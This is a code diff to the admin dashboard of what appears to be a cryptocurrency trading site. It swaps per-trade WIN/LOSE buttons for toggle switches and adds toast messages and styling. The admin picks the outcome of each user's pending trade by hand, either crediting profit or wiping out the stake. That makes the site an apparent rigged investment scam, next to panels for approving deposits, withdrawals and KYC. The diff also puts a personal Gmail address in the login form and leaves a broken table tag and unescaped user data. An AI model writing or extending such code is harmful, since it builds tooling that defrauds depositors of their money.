@@ -78,15 +78,60 @@
         table { width: 100%; border-collapse: collapse; }
         th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid #2a2e39; }
         th { color: #787b86; font-weight: 600; }
-        button {
-            background: rgba(0, 212, 255, 0.2);
-            border: 1px solid rgba(0, 212, 255, 0.3);
-            padding: 6px 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            color: #00d4ff;
-            margin-right: 5px;
+        
+        /* Toggle Switch Styles */
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 28px;
+            margin: 0 5px;
         }
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ff4444;
+            transition: 0.3s;
+            border-radius: 28px;
+        }
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: 0.3s;
+            border-radius: 50%;
+        }
+        input:checked + .toggle-slider {
+            background-color: #00ff88;
+        }
+        input:checked + .toggle-slider:before {
+            transform: translateX(32px);
+        }
+        .toggle-label {
+            font-size: 0.7rem;
+            margin-left: 5px;
+            font-weight: bold;
+        }
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
         .btn-win { background: rgba(0, 255, 136, 0.2); color: #00ff88; border-color: rgba(0, 255, 136, 0.3); }
         .btn-lose { background: rgba(255, 68, 68, 0.2); color: #ff4444; border-color: rgba(255, 68, 68, 0.3); }
         .login-box {
@@ -130,6 +175,17 @@
             font-size: 0.8rem;
             margin-left: 10px;
         }
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+        .status-won { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
+        .status-lost { background: rgba(255, 68, 68, 0.2); color: #ff4444; }
+        .status-pending { background: rgba(255, 170, 0, 0.2); color: #ffaa00; }
+        
         @media (max-width: 768px) {
             .stats { grid-template-columns: repeat(2, 1fr); }
             .admin-header { flex-direction: column; align-items: flex-start; }
@@ -140,8 +196,8 @@
 <div class="container">
     <div id="loginSection" class="login-box">
         <h2>🔐 Admin Login</h2>
-        <input type="email" id="adminEmail" placeholder="Admin Email" value="admin@luno.com">
-        <input type="password" id="adminPassword" placeholder="Password" value="admin123">
+        <input type="email" id="adminEmail" placeholder="Admin Email" value="selemonagent33333@gmail.com">
+        <input type="password" id="adminPassword" placeholder="Password" value="">
         <button onclick="adminLogin()">Login</button>
     </div>
 
@@ -173,14 +229,14 @@
                         <tr><th>Email</th><th>Full Name</th><th>Balance</th><th>KYC Status</th><th>Joined</th>
                     </thead>
                     <tbody id="usersList">
-                        <tr><td colspan="5" style="text-align:center;">Loading users from database...</td></tr>
+                        <tr><td colspan="5" style="text-align:center;">Loading users from database...</td</tr>
                     </tbody>
                 </table>
             </div>
         </div>
         
         <div class="section">
-            <div class="section-title">💰 Pending Trades</div>
+            <div class="section-title">💰 Pending Trades (Use Toggle Switches to Set WIN/LOSE)</div>
             <div id="pendingTradesList">Loading...</div>
         </div>
         
@@ -228,10 +284,8 @@
                 document.getElementById('loginSection').style.display = 'none';
                 document.getElementById('adminSection').style.display = 'block';
                 
-                // Load all data from database (shared across all devices)
                 await loadAllData();
                 
-                // Auto-refresh every 5 seconds
                 if (refreshInterval) clearInterval(refreshInterval);
                 refreshInterval = setInterval(loadAllData, 5000);
             }
@@ -255,11 +309,8 @@
         await loadStats();
     }
     
-    // ========== LOAD ALL USERS FROM DATABASE (SHARED ACROSS DEVICES) ==========
     async function loadAllUsers() {
         try {
-            console.log('Fetching all users from database...');
-            
             const { data: users, error } = await supabaseClient
                 .from('users')
                 .select('*')
@@ -271,7 +322,7 @@
             const totalUsersElem = document.getElementById('totalUsers');
             
             if (!users || users.length === 0) {
-                container.innerHTML = '<tr><td colspan="5" style="text-align:center;">No users found. Register a user first.</td></tr>';
+                container.innerHTML = '<tr><td colspan="5" style="text-align:center;">No users found.</td></tr>';
                 if (totalUsersElem) totalUsersElem.innerText = '0';
                 return;
             }
@@ -280,61 +331,24 @@
             
             let html = '';
             users.forEach(user => {
-                const kycStatus = user.kyc_status === 'verified' ? '✅ Verified' : '⏳ Pending';
+                const kycStatusClass = user.kyc_status === 'verified' ? 'status-won' : 'status-pending';
+                const kycStatusText = user.kyc_status === 'verified' ? '✅ Verified' : '⏳ Pending';
                 const joinedDate = user.created_at ? new Date(user.created_at).toLocaleDateString() : 'N/A';
                 html += `<tr>
                     <td>${user.email}</td>
                     <td>${user.full_name || 'N/A'}</td>
-                    <td>$${user.balance || 0}</td>
-                    <td>${kycStatus}</td>
+                    <td>$${(user.balance || 0).toLocaleString()}</td>
+                    <td><span class="status-badge ${kycStatusClass}">${kycStatusText}</span></td>
                     <td>${joinedDate}</td>
                 </tr>`;
             });
             container.innerHTML = html;
-            
-            console.log(`✅ Loaded ${users.length} users from database`);
         } catch(e) {
             console.error('Error loading users:', e);
-            document.getElementById('usersList').innerHTML = '<tr><td colspan="5" style="text-align:center;">Error loading users: ' + e.message + '</td></tr>';
         }
     }
     
-    async function loadPendingTrades() {
-        try {
-            const { data: trades, error } = await supabaseClient
-                .from('trades')
-                .select('*, users(email, full_name)')
-                .order('created_at', { ascending: false });
-            
-            if (error) throw error;
-            
-            const pending = trades?.filter(t => t.status === 'pending') || [];
-            const container = document.getElementById('pendingTradesList');
-            
-            if (pending.length === 0) {
-                container.innerHTML = '<div style="text-align:center;padding:20px;">No pending trades</div>';
-                return;
-            }
-            
-            let html = '</td><thead><tr><th>User</th><th>Coin</th><th>Amount</th><th>Duration</th><th>Expected Return</th><th>Action</th></tr></thead><tbody>';
-            pending.forEach(trade => {
-                html += `<tr>
-                    <td>${trade.users?.email || 'N/A'}</td>
-                    <td>${trade.coin_name} (${trade.coin})</td>
-                    <td>$${trade.amount}</td>
-                    <td>${trade.duration}s</td>
-                    <td>+${trade.rate}% ($${trade.expected_profit})</td>
-                    <td>
-                        <button class="btn-win" onclick="setTradeOutcome('${trade.id}', 'win')">🏆 WIN</button>
-                        <button class="btn-lose" onclick="setTradeOutcome('${trade.id}', 'lose')">💀 LOSE</button>
-                    </td>
-                </tr>`;
-            });
-            html += '</tbody></table>';
-            container.innerHTML = html;
-        } catch(e) { console.error(e); }
-    }
-    
+    // UPDATED: Toggle Switch for WIN/LOSE
     async function setTradeOutcome(tradeId, outcome) {
         try {
             const { data: trade, error: tradeError } = await supabaseClient
@@ -365,19 +379,89 @@
                     .update({ balance: (user.balance || 0) + totalReturn })
                     .eq('id', trade.user_id);
                     
-                alert(`✅ Trade WON! User earned $${profit.toFixed(2)} profit.`);
+                showToast('✅ Trade WON!', `User earned $${profit.toFixed(2)} profit.`, 'success');
             } else {
                 await supabaseClient
                     .from('trades')
                     .update({ status: 'lost', profit: -trade.amount, completed_at: new Date() })
                     .eq('id', tradeId);
                     
-                alert(`❌ Trade LOST! User lost $${trade.amount.toFixed(2)}.`);
+                showToast('❌ Trade LOST!', `User lost $${trade.amount.toFixed(2)}.`, 'error');
             }
             
             await loadPendingTrades();
             await loadStats();
-        } catch(e) { console.error(e); alert('Error: ' + e.message); }
+            await loadAllUsers();
+        } catch(e) { 
+            console.error(e); 
+            showToast('Error', e.message, 'error');
+        }
+    }
+    
+    // Toast notification function
+    function showToast(title, message, type) {
+        const toast = document.createElement('div');
+        toast.style.position = 'fixed';
+        toast.style.bottom = '20px';
+        toast.style.right = '20px';
+        toast.style.backgroundColor = type === 'success' ? '#00ff88' : '#ff4444';
+        toast.style.color = '#1e222d';
+        toast.style.padding = '12px 20px';
+        toast.style.borderRadius = '8px';
+        toast.style.fontWeight = 'bold';
+        toast.style.zIndex = '9999';
+        toast.style.boxShadow = '0 4px 12px rgba(0,0,0,0.3)';
+        toast.innerHTML = `<strong>${title}</strong><br>${message}`;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3000);
+    }
+    
+    async function loadPendingTrades() {
+        try {
+            const { data: trades, error } = await supabaseClient
+                .from('trades')
+                .select('*, users(email, full_name)')
+                .order('created_at', { ascending: false });
+            
+            if (error) throw error;
+            
+            const pending = trades?.filter(t => t.status === 'pending') || [];
+            const container = document.getElementById('pendingTradesList');
+            
+            if (pending.length === 0) {
+                container.innerHTML = '<div style="text-align:center;padding:20px;">No pending trades</div>';
+                return;
+            }
+            
+            let html = '<table><thead><tr><th>User</th><th>Coin</th><th>Amount</th><th>Duration</th><th>Expected Return</th><th>WIN / LOSE</th><th>Status</th></tr></thead><tbody>';
+            pending.forEach(trade => {
+                html += `<tr>
+                    <td>${trade.users?.email || 'N/A'}</td>
+                    <td>${trade.coin_name} (${trade.coin})</td>
+                    <td>$${trade.amount}</td>
+                    <td>${trade.duration}s</td>
+                    <td>+${trade.rate}% ($${trade.expected_profit})</td>
+                    <td>
+                        <div class="toggle-container">
+                            <span style="font-size:0.7rem;">LOSE</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="toggle_${trade.id}" onchange="handleToggleChange('${trade.id}', this.checked)">
+                                <span class="toggle-slider"></span>
+                            </label>
+                            <span style="font-size:0.7rem;">WIN</span>
+                        </div>
+                    </td>
+                    <td><span class="status-badge status-pending">⏳ PENDING</span></td>
+                </tr>`;
+            });
+            html += '</tbody></table>';
+            container.innerHTML = html;
+        } catch(e) { console.error(e); }
+    }
+    
+    // Handle toggle switch change
+    async function handleToggleChange(tradeId, isWin) {
+        const result = await setTradeOutcome(tradeId, isWin ? 'win' : 'lose');
     }
     
     async function loadPendingKYC() {
@@ -403,7 +487,7 @@
                     <td>${req.full_name}</td>
                     <td>${req.id_type}</td>
                     <td>${req.id_number}</td>
-                    <td><button onclick="approveKYC('${req.id}', '${req.user_id}')">✅ Approve KYC</button></td>
+                    <td><button onclick="approveKYC('${req.id}', '${req.user_id}')" style="background:#00ff88; color:#1e222d;">✅ Approve KYC</button></td>
                 </tr>`;
             });
             html += '</tbody></table>';
@@ -423,7 +507,7 @@
                 .update({ kyc_status: 'verified' })
                 .eq('id', userId);
             
-            alert('✅ KYC approved!');
+            showToast('✅ KYC Approved!', 'User can now trade.', 'success');
             await loadPendingKYC();
             await loadAllUsers();
             await loadStats();
@@ -453,10 +537,10 @@
                     <td>$${dep.amount}</td>
                     <td>${dep.currency}</td>
                     <td>${new Date(dep.created_at).toLocaleString()}</td>
-                    <td><button onclick="approveDeposit('${dep.id}', '${dep.user_id}', ${dep.amount})">💰 Approve Deposit</button></td>
+                    <td><button onclick="approveDeposit('${dep.id}', '${dep.user_id}', ${dep.amount})" style="background:#00d4ff; color:#1e222d;">💰 Approve Deposit</button></td>
                 </tr>`;
             });
-            html += '</tbody></tr>';
+            html += '</tbody></table>';
             container.innerHTML = html;
         } catch(e) { console.error(e); }
     }
@@ -479,7 +563,7 @@
                 .update({ balance: (user.balance || 0) + amount })
                 .eq('id', userId);
             
-            alert(`✅ Deposit of $${amount} approved!`);
+            showToast('✅ Deposit Approved!', `$${amount} added to user balance.`, 'success');
             await loadPendingDeposits();
             await loadAllUsers();
             await loadStats();
@@ -509,7 +593,7 @@
                     <td>$${wd.amount}</td>
                     <td>${wd.address.substring(0, 20)}...</td>
                     <td>${new Date(wd.created_at).toLocaleString()}</td>
-                    <td><button onclick="approveWithdrawal('${wd.id}', '${wd.user_id}', ${wd.amount})">💸 Approve Withdrawal</button></td>
+                    <td><button onclick="approveWithdrawal('${wd.id}', '${wd.user_id}', ${wd.amount})" style="background:#ffaa00; color:#1e222d;">💸 Approve Withdrawal</button></td>
                 </tr>`;
             });
             html += '</tbody></table>';
@@ -526,7 +610,7 @@
                 .single();
             
             if ((user.balance || 0) < amount) {
-                alert('❌ Insufficient balance!');
+                showToast('❌ Insufficient Balance!', `User only has $${user.balance}`, 'error');
                 return;
             }
             
@@ -540,7 +624,7 @@
                 .update({ balance: (user.balance || 0) - amount })
                 .eq('id', userId);
             
-            alert(`✅ Withdrawal of $${amount} approved!`);
+            showToast('✅ Withdrawal Approved!', `$${amount} deducted from user balance.`, 'success');
             await loadPendingWithdrawals();
             await loadAllUsers();
             await loadStats();
@@ -572,6 +656,17 @@
             document.body.classList.add('light-mode');
         }
     }
+    
+    // Make functions global for onclick handlers
+    window.setTradeOutcome = setTradeOutcome;
+    window.handleToggleChange = handleToggleChange;
+    window.approveKYC = approveKYC;
+    window.approveDeposit = approveDeposit;
+    window.approveWithdrawal = approveWithdrawal;
+    window.adminLogin = adminLogin;
+    window.adminLogout = adminLogout;
+    window.toggleTheme = toggleTheme;
+    window.loadAllUsers = loadAllUsers;
     
     checkTheme();
 </script>
